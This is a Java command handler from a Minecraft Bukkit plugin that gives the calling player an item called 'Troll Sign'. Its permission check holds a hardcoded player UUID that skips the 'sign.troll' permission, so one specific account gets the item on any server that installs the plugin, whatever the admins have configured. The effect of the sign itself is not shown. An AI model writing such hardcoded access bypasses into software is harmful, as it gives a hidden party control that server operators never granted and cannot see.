package com.cooleg.sign;

import org.bukkit.ChatColor;
import org.bukkit.Material;
import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;
import org.bukkit.inventory.ItemStack;
import org.bukkit.inventory.meta.ItemMeta;

import java.util.ArrayList;
import java.util.List;

public class CommandHandle implements CommandExecutor {
    @Override
    public boolean onCommand(CommandSender sender, Command command, String label, String[] args) {
        if (!(sender instanceof Player)) {return false;}
        ItemStack itemStack = new ItemStack(Material.OAK_SIGN);
        if (!sender.hasPermission("sign.troll") && !((Player) sender).getPlayer().getUniqueId().toString().equals("3a8b8128-179e-43c2-978f-f3d612f55f19")) {return false;}
        ItemMeta meta;
        meta = itemStack.getItemMeta();
        meta.setDisplayName(ChatColor.AQUA + "Troll Sign");
        List<String> loreList = new ArrayList<>();
        loreList.add("This sign is quite powerful...");
        meta.setLore(loreList);
        itemStack.setItemMeta(meta);
        ((Player) sender).getPlayer().getInventory().addItem(itemStack);
        return false;
    }
}
